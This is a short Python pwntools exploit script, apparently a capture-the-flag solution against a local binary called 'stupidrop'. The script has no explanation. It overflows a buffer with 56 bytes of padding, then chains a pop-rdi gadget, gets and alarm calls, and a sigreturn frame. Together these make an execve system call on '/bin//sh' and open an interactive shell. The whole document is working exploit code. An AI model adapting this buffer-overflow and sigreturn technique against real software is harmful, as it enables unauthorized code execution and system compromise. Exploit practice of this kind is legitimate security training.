from pwn import *
import time

target = process('./stupidrop')
context.clear(arch='amd64')
#context.log_level = 'debug'

bssAddr = p64(0x601051)
sys = p64(0x40063e)
alarm = p64(0x4004b0)
gets = p64(0x4004d0)
popRdi = p64(0x4006a3)

frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x601051
frame.rdx = 0x0
frame.rsi = 0x0
frame.rip = 0x40063e
#gdb.attach(target, gdbscript = 'b *(0x4005f6)')
payload = b""
#gdb.attach(target, gdbscript = 'b *(main)')
payload += b"A" * 56 + popRdi + bssAddr + gets + popRdi + p64(0xf) + alarm + popRdi + p64(0xff) + alarm + sys + bytes(frame)

time.sleep(1)
#gdb.attach(target, gdbscript = 'b *(0x4005f6)')
#gdb.attach(target, gdbscript = 'b *(0x400637)')
target.sendline(payload)
#gdb.attach(target, gdbscript = 'b *(0x40063e)')
target.sendline(b"/bin//sh")




#target.send(b"/bin//sh")


target.interactive()
